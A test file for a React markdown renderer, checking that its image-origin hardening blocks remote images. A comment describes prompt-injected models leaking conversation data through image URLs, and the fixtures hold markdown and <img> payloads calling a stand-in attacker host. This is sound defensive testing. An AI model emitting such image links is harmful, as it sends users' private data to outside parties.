import { render } from "@testing-library/react";
import { harden } from "rehype-harden";
import { describe, expect, it } from "vitest";
import { defaultRehypePlugins, Streamdown } from "../index";

// A prompt-injected model can emit an image whose URL carries conversation
// data. The browser requests it as soon as the message renders.
const exfilMarkdown = "![](https://attacker.example/p?d=secret)";

const imageSources = (container: HTMLElement) =>
  Array.from(container.querySelectorAll("img")).map((img) =>
    img.getAttribute("src")
  );

describe("remote image origins (rehype-harden)", () => {
  it("documents the default: images from any origin are rendered", () => {
    const { container } = render(
      <Streamdown mode="static">{exfilMarkdown}</Streamdown>
    );

    expect(imageSources(container)).toContain(
      "https://attacker.example/p?d=secret"
    );
  });

  it("documents the default: raw <img> HTML from any origin is rendered", () => {
    const { container } = render(
      <Streamdown mode="static">
        {'<img src="https://attacker.example/p?d=secret" alt="x" />'}
      </Streamdown>
    );

    expect(imageSources(container)).toContain(
      "https://attacker.example/p?d=secret"
    );
  });

  it("blocks untrusted image origins with the recommended AI-chat config", () => {
    const { container } = render(
      <Streamdown
        mode="static"
        rehypePlugins={[
          defaultRehypePlugins.raw,
          defaultRehypePlugins.sanitize,
          [
            harden,
            {
              allowedImagePrefixes: ["https://cdn.example.com/"],
              defaultOrigin: "https://app.example.com",
              allowedLinkPrefixes: ["*"],
              allowedProtocols: ["*"],
              allowDataImages: false,
            },
          ],
        ]}
      >
        {exfilMarkdown}
      </Streamdown>
    );

    expect(imageSources(container)).not.toContain(
      "https://attacker.example/p?d=secret"
    );
    expect(container.innerHTML).not.toContain("attacker.example");
  });

  it("blocks raw <img> HTML from untrusted origins with the same config", () => {
    const { container } = render(
      <Streamdown
        mode="static"
        rehypePlugins={[
          defaultRehypePlugins.raw,
          defaultRehypePlugins.sanitize,
          [
            harden,
            {
              allowedImagePrefixes: ["https://cdn.example.com/"],
              defaultOrigin: "https://app.example.com",
              allowedLinkPrefixes: ["*"],
              allowedProtocols: ["*"],
              allowDataImages: false,
            },
          ],
        ]}
      >
        {'<img src="https://attacker.example/p?d=secret" alt="x" />'}
      </Streamdown>
    );

    expect(container.innerHTML).not.toContain("attacker.example");
  });

  it("still renders images from an allowed origin", () => {
    const { container } = render(
      <Streamdown
        mode="static"
        rehypePlugins={[
          defaultRehypePlugins.raw,
          defaultRehypePlugins.sanitize,
          [
            harden,
            {
              allowedImagePrefixes: ["https://cdn.example.com/"],
              defaultOrigin: "https://app.example.com",
              allowedLinkPrefixes: ["*"],
              allowedProtocols: ["*"],
              allowDataImages: false,
            },
          ],
        ]}
      >
        {"![ok](https://cdn.example.com/a.png)"}
      </Streamdown>
    );

    expect(imageSources(container)).toContain("https://cdn.example.com/a.png");
  });

  it("blocks data: images when allowDataImages is false", () => {
    const { container } = render(
      <Streamdown
        mode="static"
        rehypePlugins={[
          defaultRehypePlugins.raw,
          defaultRehypePlugins.sanitize,
          [
            harden,
            {
              allowedImagePrefixes: ["*"],
              allowedLinkPrefixes: ["*"],
              allowedProtocols: ["*"],
              allowDataImages: false,
            },
          ],
        ]}
      >
        {"![](data:image/png;base64,AAAA)"}
      </Streamdown>
    );

    expect(container.innerHTML).not.toContain("data:image");
  });
});
